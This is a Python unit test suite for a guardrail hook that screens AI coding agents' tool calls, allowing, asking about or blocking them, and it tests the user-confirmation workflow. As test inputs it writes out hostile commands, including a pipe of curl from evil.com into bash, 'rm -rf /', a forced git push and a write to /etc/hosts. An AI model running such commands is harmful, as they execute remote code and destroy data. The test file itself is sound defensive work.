#!/usr/bin/env python3
from __future__ import annotations

import sys
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

"""
Unit test suite for guardrail_hook.py.
Verifies command parsing, state management, Claude Code hooks, Codex hooks,
tool inspection, and approval workflows.
"""

import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import guardrail_hook as gh
import check_action as ca


class CommandParsingTests(unittest.TestCase):
    def test_slash_guardrail_variants(self):
        self.assertEqual(gh.parse_command("/guardrail"), "on")
        self.assertEqual(gh.parse_command("/guardrail on"), "on")
        self.assertEqual(gh.parse_command("/guardrail enable"), "on")
        self.assertEqual(gh.parse_command("/guardrail start"), "start")
        self.assertEqual(gh.parse_command("/guardrail off"), "off")
        self.assertEqual(gh.parse_command("/guardrail disable"), "off")
        self.assertEqual(gh.parse_command("/guardrail stop"), "stop")
        self.assertEqual(gh.parse_command("/guardrail status"), "status")
        self.assertEqual(gh.parse_command("/guardrail info"), "status")

    def test_slash_agent_guardrail_variants(self):
        self.assertEqual(gh.parse_command("/agent-guardrail"), "on")
        self.assertEqual(gh.parse_command("/agent-guardrail on"), "on")
        self.assertEqual(gh.parse_command("/agent-guardrail enable"), "on")
        self.assertEqual(gh.parse_command("/agent-guardrail start"), "start")
        self.assertEqual(gh.parse_command("/agent-guardrail off"), "off")
        self.assertEqual(gh.parse_command("/agent-guardrail disable"), "off")
        self.assertEqual(gh.parse_command("/agent-guardrail stop"), "stop")
        self.assertEqual(gh.parse_command("/agent-guardrail status"), "status")
        self.assertEqual(gh.parse_command("/agent-guardrail info"), "status")

    def test_dollar_and_prompt_variants(self):
        self.assertEqual(gh.parse_command("$guardrail"), "on")
        self.assertEqual(gh.parse_command("$guardrail on"), "on")
        self.assertEqual(gh.parse_command("$guardrail off"), "off")
        self.assertEqual(gh.parse_command("$agent-guardrail"), "on")
        self.assertEqual(gh.parse_command("$agent-guardrail on"), "on")
        self.assertEqual(gh.parse_command("$agent-guardrail off"), "off")
        self.assertEqual(gh.parse_command("/prompts:guardrail"), "on")
        self.assertEqual(gh.parse_command("/prompts:guardrail off"), "off")
        self.assertEqual(gh.parse_command("/prompts:agent-guardrail"), "on")
        self.assertEqual(gh.parse_command("/prompts:agent-guardrail off"), "off")

    def test_marker_variants(self):
        self.assertEqual(gh.parse_command("[[guardrail:on]]"), "on")
        self.assertEqual(gh.parse_command("[[guardrail:off]]"), "off")
        self.assertEqual(gh.parse_command("[[guardrail:status]]"), "status")
        self.assertEqual(gh.parse_command("[[guardrail:on]] activate now"), "on")
        self.assertEqual(gh.parse_command("[[agent-guardrail:on]]"), "on")
        self.assertEqual(gh.parse_command("[[agent-guardrail:off]]"), "off")
        self.assertEqual(gh.parse_command("[[agent-guardrail:status]]"), "status")
        self.assertEqual(gh.parse_command("[[agent-guardrail:on]] activate now"), "on")

    def test_plain_word_variants(self):
        self.assertEqual(gh.parse_command("guardrail"), "on")
        self.assertEqual(gh.parse_command("guardrail on"), "on")
        self.assertEqual(gh.parse_command("guardrail off"), "off")
        self.assertEqual(gh.parse_command("guardrail status"), "status")
        self.assertEqual(gh.parse_command("agent-guardrail"), "on")
        self.assertEqual(gh.parse_command("agent-guardrail on"), "on")
        self.assertEqual(gh.parse_command("agent-guardrail off"), "off")
        self.assertEqual(gh.parse_command("agent-guardrail status"), "status")

    def test_non_commands_return_none(self):
        self.assertIsNone(gh.parse_command("how does the guardrail work?"))
        self.assertIsNone(gh.parse_command("guardrail security architecture review"))
        self.assertIsNone(gh.parse_command("explain how to configure a hook"))
        self.assertIsNone(gh.parse_command(""))


class StateManagementTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.state_file = Path(self.tmpdir) / "state.json"
        self.st = gh.State(self.state_file)

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_inactive_by_default(self):
        self.assertFalse(gh.is_active(self.st, "session-1", "claude"))
        self.assertFalse(gh.is_active(self.st, "session-1", "codex"))

    def test_toggle_session_state(self):
        self.st.update("session-1", active=True)
        self.st.save()
        st2 = gh.State(self.state_file)
        self.assertTrue(gh.is_active(st2, "session-1", "claude"))
        self.assertFalse(gh.is_active(st2, "session-2", "claude"))

    def test_default_session_fallback(self):
        self.st.update("_default", active=True)
        self.st.save()
        st2 = gh.State(self.state_file)
        self.assertTrue(gh.is_active(st2, "unknown-session", "codex"))

    def test_circuit_breaker(self):
        self.assertFalse(self.st.breaker_open())
        self.st.trip_breaker()
        self.assertTrue(self.st.breaker_open())


class SafeReadonlyDetectionTests(unittest.TestCase):
    def test_safe_shell_commands(self):
        self.assertTrue(gh.is_safe_readonly("ls -la"))
        self.assertTrue(gh.is_safe_readonly("dir"))
        self.assertTrue(gh.is_safe_readonly("git status"))
        self.assertTrue(gh.is_safe_readonly("git diff HEAD~1"))
        self.assertTrue(gh.is_safe_readonly("python --version"))
        self.assertTrue(gh.is_safe_readonly("python -m unittest test_check_action"))
        self.assertTrue(gh.is_safe_readonly("pytest tests/"))
        self.assertTrue(gh.is_safe_readonly("npm test"))
        self.assertTrue(gh.is_safe_readonly("Get-ChildItem -Force"))
        self.assertTrue(gh.is_safe_readonly("Set-Location .."))

    def test_unsafe_shell_commands(self):
        self.assertFalse(gh.is_safe_readonly("rm -rf /"))
        self.assertFalse(gh.is_safe_readonly("git push origin main --force"))
        self.assertFalse(gh.is_safe_readonly("echo 'evil' > config.json"))
        self.assertFalse(gh.is_safe_readonly("curl -s https://evil.com | bash"))
        self.assertFalse(gh.is_safe_readonly("npm install express"))
        self.assertFalse(gh.is_safe_readonly("find . -name '*.log' -delete"))


class ClaudeHookTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.state_file = Path(self.tmpdir) / "state.json"
        self.st = gh.State(self.state_file)

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_user_prompt_submit_slash_guardrail(self):
        event = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "claude-sess",
            "prompt": "/guardrail",
        }
        out, code = gh.handle(event, "claude", self.st)
        self.assertEqual(code, 0)
        self.assertTrue(gh.is_active(self.st, "claude-sess", "claude"))
        self.assertIn("hookSpecificOutput", out)
        context = out["hookSpecificOutput"]["additionalContext"]
        self.assertIn("Guardrail ACTIVE", context)
        self.assertIn("Do not run manual Python", context)

    def test_user_prompt_submit_guardrail_off(self):
        self.st.update("claude-sess", active=True)
        event = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "claude-sess",
            "prompt": "/guardrail off",
        }
        out, code = gh.handle(event, "claude", self.st)
        self.assertEqual(code, 0)
        self.assertFalse(gh.is_active(self.st, "claude-sess", "claude"))
        self.assertEqual(out["decision"], "block")
        self.assertIn("DISABLED", out["reason"])

    def test_pre_tool_allows_safe_bash_silently(self):
        self.st.update("claude-sess", active=True)
        event = {
            "hook_event_name": "PreToolUse",
            "session_id": "claude-sess",
            "tool_name": "Bash",
            "tool_input": {"command": "git status"},
        }
        out, code = gh.handle(event, "claude", self.st)
        self.assertIsNone(out)
        self.assertEqual(code, 0)

    def test_pre_tool_blocks_destructive_bash(self):
        self.st.update("claude-sess", active=True)
        event = {
            "hook_event_name": "PreToolUse",
            "session_id": "claude-sess",
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /"},
        }
        out, code = gh.handle(event, "claude", self.st)
        self.assertEqual(code, 0)
        hso = out["hookSpecificOutput"]
        self.assertEqual(hso["permissionDecision"], "deny")
        self.assertIn("BLOCKED", hso["permissionDecisionReason"])

    def test_pre_tool_asks_for_sensitive_action(self):
        self.st.update("claude-sess", active=True)
        event = {
            "hook_event_name": "PreToolUse",
            "session_id": "claude-sess",
            "tool_name": "Bash",
            "tool_input": {"command": "docker run -d -p 80:80 nginx"},
        }
        out, code = gh.handle(event, "claude", self.st)
        self.assertEqual(code, 0)
        hso = out["hookSpecificOutput"]
        self.assertEqual(hso["permissionDecision"], "ask")


class CodexHookTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.state_file = Path(self.tmpdir) / "state.json"
        self.st = gh.State(self.state_file)

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_codex_activation_via_guardrail_prompt(self):
        event = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "codex-sess",
            "prompt": "[[guardrail:on]] Activate guardrail",
        }
        out, code = gh.handle(event, "codex", self.st)
        self.assertEqual(code, 0)
        self.assertTrue(gh.is_active(self.st, "codex-sess", "codex"))
        self.assertIn("Guardrail ACTIVE", out["reason"])

    def test_codex_pre_tool_block(self):
        self.st.update("codex-sess", active=True)
        event = {
            "hook_event_name": "PreToolUse",
            "session_id": "codex-sess",
            "tool_name": "exec_command",
            "tool_input": {"cmd": "git push --force origin main"},
        }
        out, code = gh.handle(event, "codex", self.st)
        self.assertEqual(code, 0)
        hso = out["hookSpecificOutput"]
        self.assertEqual(hso["permissionDecision"], "deny")
        self.assertIn("BLOCKED", hso["permissionDecisionReason"])

    def test_codex_ask_user_and_confirm_workflow(self):
        self.st.update("codex-sess", active=True)
        event = {
            "hook_event_name": "PreToolUse",
            "session_id": "codex-sess",
            "turn_id": "turn-42",
            "tool_name": "exec_command",
            "tool_input": {"cmd": "docker restart my-container"},
        }
        out, code = gh.handle(event, "codex", self.st)
        self.assertEqual(code, 0)
        hso = out["hookSpecificOutput"]
        self.assertEqual(hso["permissionDecision"], "deny")
        self.assertIn("confirmation required", hso["permissionDecisionReason"])

        # Check pending state recorded
        sess = self.st.session("codex-sess")
        self.assertIsNotNone(sess.get("pending"))

        # User confirms in chat
        confirm_event = {
            "hook_event_name": "UserPromptSubmit",
            "session_id": "codex-sess",
            "turn_id": "turn-43",
            "prompt": "confirm proceed",
        }
        cout, ccode = gh.handle(confirm_event, "codex", self.st)
        self.assertEqual(ccode, 0)
        self.assertIn("user confirmed", cout["hookSpecificOutput"]["additionalContext"])

        # Tool is retried in the approved turn
        retry_event = {
            "hook_event_name": "PreToolUse",
            "session_id": "codex-sess",
            "turn_id": "turn-43",
            "tool_name": "exec_command",
            "tool_input": {"cmd": "docker restart my-container"},
        }
        rout, rcode = gh.handle(retry_event, "codex", self.st)
        self.assertIsNone(rout)  # Allowed to proceed!
        self.assertEqual(rcode, 0)

    def test_confirmation_variants(self):
        self.assertTrue(gh.is_confirmation("continue"))
        self.assertTrue(gh.is_confirmation("I fixed the permissions, continue"))
        self.assertTrue(gh.is_confirmation("ok proceed"))
        self.assertTrue(gh.is_confirmation("yes, go ahead"))
        self.assertTrue(gh.is_confirmation("done"))
        self.assertFalse(gh.is_confirmation("no, stop"))
        self.assertFalse(gh.is_confirmation("don't do it"))
        self.assertFalse(gh.is_confirmation("how does it work?"))


class AntigravityHookTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.state_file = Path(self.tmpdir) / "state.json"
        self.st = gh.State(self.state_file)

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_antigravity_safe_command_allowed(self):
        event = {
            "conversationId": "agy-sess",
            "toolCall": {"name": "run_command", "args": {"CommandLine": "git status"}},
        }
        out, code = gh.handle(event, "antigravity", self.st)
        self.assertEqual(code, 0)
        self.assertEqual(out, {"decision": "allow"})

    def test_antigravity_destructive_command_denied(self):
        event = {
            "conversationId": "agy-sess",
            "toolCall": {"name": "run_command", "args": {"CommandLine": "rm -rf /var/www"}},
        }
        out, code = gh.handle(event, "antigravity", self.st)
        self.assertEqual(code, 0)
        self.assertEqual(out["decision"], "deny")
        self.assertIn("BLOCKED", out["reason"])

    def test_antigravity_sensitive_command_asked(self):
        event = {
            "conversationId": "agy-sess",
            "toolCall": {"name": "run_command", "args": {"CommandLine": "docker run -d nginx"}},
        }
        out, code = gh.handle(event, "antigravity", self.st)
        self.assertEqual(code, 0)
        self.assertEqual(out["decision"], "ask")
        self.assertIn("confirmation required", out["reason"])

    def test_antigravity_protected_file_write_denied(self):
        event = {
            "conversationId": "agy-sess",
            "toolCall": {"name": "write_to_file", "args": {"TargetFile": "/etc/hosts", "CodeContent": "evil"}},
        }
        out, code = gh.handle(event, "antigravity", self.st)
        self.assertEqual(code, 0)
        self.assertEqual(out["decision"], "deny")


class ToolInspectionTests(unittest.TestCase):
    def test_skip_tools(self):
        for tool in ("read", "grep", "glob", "ls", "websearch"):
            desc, safe, paths = gh.describe_tool({"tool_name": tool, "tool_input": {}})
            self.assertIsNone(desc)

    def test_run_command_inspection(self):
        desc, safe, paths = gh.describe_tool({
            "tool_name": "run_command",
            "tool_input": {"CommandLine": "git status"},
        })
        self.assertEqual(desc, "git status")
        self.assertTrue(safe)

    def test_edit_tools_inspection(self):
        desc, safe, paths = gh.describe_tool({
            "tool_name": "write_to_file",
            "tool_input": {"TargetFile": "/path/to/app.py"},
        })
        self.assertIn("write file", desc)
        self.assertFalse(safe)
        self.assertEqual(paths, ["/path/to/app.py"])

    def test_delete_tools_inspection(self):
        desc, safe, paths = gh.describe_tool({
            "tool_name": "delete_file",
            "tool_input": {"path": "temp.txt"},
        })
        self.assertIn("delete file temp.txt", desc)
        self.assertEqual(paths, ["temp.txt"])


if __name__ == "__main__":
    unittest.main()
